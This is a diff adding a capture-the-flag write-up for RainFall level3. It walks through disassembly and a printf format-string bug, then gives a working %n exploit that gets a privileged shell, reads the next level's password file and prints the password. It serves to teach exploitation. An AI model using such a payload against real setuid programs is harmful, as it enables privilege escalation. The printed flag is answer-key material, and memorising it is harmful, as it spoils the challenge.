@@ -1,0 +1,142 @@
+For this level, we only have an executable called level3:
+```bash
+level3@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3
+
+```
+
+Let’s try to execute it:
+```bash
+level3@RainFall:~$ ./level3
+
+```
+
+The program is waiting for input, so let’s try sending something and see if we get lucky and find the correct string:
+```bash
+level3@RainFall:~$ ./level3
+lol
+lol
+```
+
+This time the input given is sending back as output we can deduc that a put*, print* or similar is called but nothibg more. We therefore inspect the binary using objdump:
+```bash
+080484a4 <v>:
+ 80484a4:	55                   	push   %ebp
+ 80484a5:	89 e5                	mov    %esp,%ebp
+ 80484a7:	81 ec 18 02 00 00    	sub    $0x218,%esp
+ 80484ad:	a1 60 98 04 08       	mov    0x8049860,%eax
+ 80484b2:	89 44 24 08          	mov    %eax,0x8(%esp)
+ 80484b6:	c7 44 24 04 00 02 00 	movl   $0x200,0x4(%esp)
+ 80484bd:	00 
+ 80484be:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
+ 80484c4:	89 04 24             	mov    %eax,(%esp)
+ 80484c7:	e8 d4 fe ff ff       	call   80483a0 <fgets@plt>
+ 80484cc:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
+ 80484d2:	89 04 24             	mov    %eax,(%esp)
+ 80484d5:	e8 b6 fe ff ff       	call   8048390 <printf@plt>
+ 80484da:	a1 8c 98 04 08       	mov    0x804988c,%eax
+ 80484df:	83 f8 40             	cmp    $0x40,%eax
+ 80484e2:	75 34                	jne    8048518 <v+0x74>
+ 80484e4:	a1 80 98 04 08       	mov    0x8049880,%eax
+ 80484e9:	89 c2                	mov    %eax,%edx
+ 80484eb:	b8 00 86 04 08       	mov    $0x8048600,%eax
+ 80484f0:	89 54 24 0c          	mov    %edx,0xc(%esp)
+ 80484f4:	c7 44 24 08 0c 00 00 	movl   $0xc,0x8(%esp)
+ 80484fb:	00 
+ 80484fc:	c7 44 24 04 01 00 00 	movl   $0x1,0x4(%esp)
+ 8048503:	00 
+ 8048504:	89 04 24             	mov    %eax,(%esp)
+ 8048507:	e8 a4 fe ff ff       	call   80483b0 <fwrite@plt>
+ 804850c:	c7 04 24 0d 86 04 08 	movl   $0x804860d,(%esp)
+ 8048513:	e8 a8 fe ff ff       	call   80483c0 <system@plt>
+ 8048518:	c9                   	leave  
+ 8048519:	c3                   	ret    
+
+0804851a <main>:
+ 804851a:	55                   	push   %ebp
+ 804851b:	89 e5                	mov    %esp,%ebp
+ 804851d:	83 e4 f0             	and    $0xfffffff0,%esp
+ 8048520:	e8 7f ff ff ff       	call   80484a4 <v>
+ 8048525:	c9                   	leave  
+ 8048526:	c3                   	ret    
+ 8048527:	90                   	nop
+ 8048528:	90                   	nop
+ 8048529:	90                   	nop
+ 804852a:	90                   	nop
+ 804852b:	90                   	nop
+ 804852c:	90                   	nop
+ 804852d:	90                   	nop
+ 804852e:	90                   	nop
+ 804852f:	90                   	nop
+
+```
+
+We immediately notice a call to printf (line 37), which is vulnerable to a classic stack-based leak if a variable is passed directly to it instead of being printed with a format specifier such as %s, %d, %x, etc.
+
+After the call to gets, the program performs a comparison (cmp) between eax, which has been loaded with the value of the address 0x804988c, and 0x40, which corresponds to the decimal value 64.
+
+```bash
+ 80484da:	a1 8c 98 04 08       	mov    0x804988c,%eax
+ 80484df:	83 f8 40             	cmp    $0x40,%eax
+ 80484e2:	75 34                	jne    8048518 <v+0x74>
+ ...
+ 8048518:	c9                   	leave 
+```
+Ok if the comparaison fail we jump (jne) directly to the leave instruction (8048518) and as we can see on the source code, miss the beautiful system call that will gives us a shell with the level4 privilege.
+
+```c
+void v(void)
+{
+  char local_20c [520];
+  
+  fgets(local_20c,0x200,stdin);
+  printf(local_20c);
+  if (m == 0x40) {
+    fwrite("Wait what?!\n",1,0xc,stdout);
+    system("/bin/sh");
+  }
+  return;
+}
+
+void main(void)
+{
+  v();
+  return;
+}
+```
+
+We also notice that the printf call is not secure!
+
+good printf call:
+```c
+printf("%s", variable);
+```
+
+bad printf call:
+```c
+printf(variable);
+```
+
+If a format string is not specified and a variable is unintentionally passed directly to printf, the program may unintentionally expose the contents of its execution stack. In some cases, this even allows reading data from arbitrary addresses within the process’s address space, including the buffer used by our variable.
+
+exemple:
+
+```bash
+level3@RainFall:~$ ./level3
+-> AAAA %x %x %x %x       
+-> AAAA 200 b7fd1ac0 b7ff37d0 41414141
+```
+
+The fourth value on the stack, 41414141, corresponds to our injected buffer (AAAA) passed to printf.
+
+We exploit the %n format specifier, which writes the number of characters printed so far to a specified memory address. By supplying the address of the buffer that is later moved into eax before the comparison with 0x40 (64 in decimal), and ensuring that 64 characters are printed, we can influence the outcome of this comparison.
+
+To access the fourth stack element (our supplied address), we use %4$n instead of %n.
+
+Final exploit:
+```bash
+    (python -c 'print("\x8c\x98\x04\x08AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%4$n")' && cat) | ./level3
+    cat /home/user/level4/.pass
+    b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+```
